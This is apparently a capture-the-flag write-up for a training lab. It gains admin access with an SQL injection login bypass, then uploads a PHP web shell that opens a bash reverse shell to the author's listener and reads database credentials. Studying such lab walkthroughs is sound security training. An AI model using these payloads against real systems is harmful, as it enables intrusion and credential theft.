## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
This warmup machine focuses on teaching how to exploit the SQL Injection vulnerability, which causes database exploits, and the File Upload vulnerability, which causes malicious files to be uploaded to the server.  
  
It is recommended for practicing how to discover and exploit SQL Injection and File Upload vulnerabilities.
```

## IP-Address
```IP_Address
172.20.17.42
```

Lets Start With 
## RustScan

```bash
$ rustscan -a 172.20.17.42 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn -A
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: InnovifyAI
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql   syn-ack ttl 63 MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/23%OT=80%CT=%CU=31216%PV=Y%DS=2%DC=T%G=N%TM=6880B290
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11
OS:NW7%O6=M509ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 32.342 days (since Fri Jun 20 21:46:40 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
```

Then Runs 
## Feroxbuster
```bash
$ feroxbuster -u http://172.20.17.42 \ 
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,js,html,txt \
  -n -k -t 50

403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       12l      557w    35445c http://172.20.17.42/assets/vendor/isotope-layout/isotope.pkgd.min.js
200      GET        1l      133w    68028c http://172.20.17.42/assets/vendor/boxicons/css/boxicons.min.css
200      GET     1039l     5533w   500430c http://172.20.17.42/assets/img/img3.jpg
200      GET        7l     1207w    80663c http://172.20.17.42/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET      180l      426w     4355c http://172.20.17.42/assets/js/main.js
200      GET        9l      155w     5417c http://172.20.17.42/assets/vendor/purecounter/purecounter_vanilla.js
200      GET        1l      268w    13800c http://172.20.17.42/assets/vendor/aos/aos.js
200      GET        1l      233w    13749c http://172.20.17.42/assets/vendor/glightbox/css/glightbox.min.css
200      GET     1545l     3039w    27312c http://172.20.17.42/assets/css/style.css
200      GET        1l      625w    55880c http://172.20.17.42/assets/vendor/glightbox/js/glightbox.min.js
200      GET      319l     1748w   148954c http://172.20.17.42/assets/img/img4.jpg
200      GET     2583l    12852w   123381c http://172.20.17.42/assets/vendor/remixicon/remixicon.css
200      GET     2078l    10308w    98255c http://172.20.17.42/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        6l     2256w   232948c http://172.20.17.42/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET        1l      273w    28765c http://172.20.17.42/assets/vendor/aos/aos.css
200      GET      297l      968w    12835c http://172.20.17.42/
301      GET        9l       28w      313c http://172.20.17.42/assets => http://172.20.17.42/assets/
200      GET      297l      968w    12835c http://172.20.17.42/index.php
[####################] - 88s    23900/23900   0s      found:18      errors:0      
[####################] - 88s    23725/23725   271/s   http://172.20.17.42/
```

After Navigating to the site I Found out Login page Which Redirect to 
`dashboard.innovifyai.hackviser` and then for accessing that we need to add that domain in out hosts file so 
```bash
nano /etc/hosts
172.20.17.42   dashboard.innovifyai.hackviser
```
Then We access the website for then I tried Credentials
```Credentials
test:test  
```
Which concluded not acceptable as frontend required @ sign
so In the burp I tried to send request without @ and its succeed and i send 
the final payload in burp is
```Burp Payload
POST /login_process.php HTTP/1.1
Host: dashboard.innovifyai.hackviser
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://dashboard.innovifyai.hackviser
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dashboard.innovifyai.hackviser/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=0m0tf7uca6evktg24ieot3n5bp
Connection: keep-alive
email=' OR 1=1 # &password=asd
```
and got the Admin Access and then we navigate to `/settings.php` where we can upload picture not only picture but actual payload as there is not filter at all so I just upload an `.php` payload which directly give me the access on my root shell
File_Payload
```bash
$ echo "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/10.8.33.208/4444 0>&1\"'); ?>" > shell.php
$ chmod +x shell.php
```
and I upload this file and surf on it and BOOM got the shell
and then we discover the next question what what ID PID 

```bash
www-data@bee:/var/www/dashboard.innovifyai.hackviser$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and The MySQL Password is 
```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.33.208] from (UNKNOWN) [172.20.32.30] 42650
bash: cannot set terminal process group (467): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bee:/var/www/dashboard.innovifyai.hackviser/uploads$ whoami
whoami
www-data
www-data@bee:/var/www/dashboard.innovifyai.hackviser/uploads$ cd ..
cd ..
www-data@bee:/var/www/dashboard.innovifyai.hackviser$ ls
ls
assets
css
customers.php
db_connect.php
default.png
employees.php
index.php
js
login.php
login_process.php
logout.php
orders.php
settings.php
shell.php
style.css
update.php
upload.php
uploads
www-data@bee:/var/www/dashboard.innovifyai.hackviser$ cat db_connect.php
cat db_connect.php
<?php
$servername = "localhost"; 
$username = "root"; 
$password = "[password omitted]"; 
$database = "innovifyai"; 
try {
    $conn = new PDO("mysql:host=$servername;dbname=$database", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}
?>www-data@bee:/var/www/dashboard.innovifyai.hackviser$ 
```

Password is 
```Password
[password omitted]
```
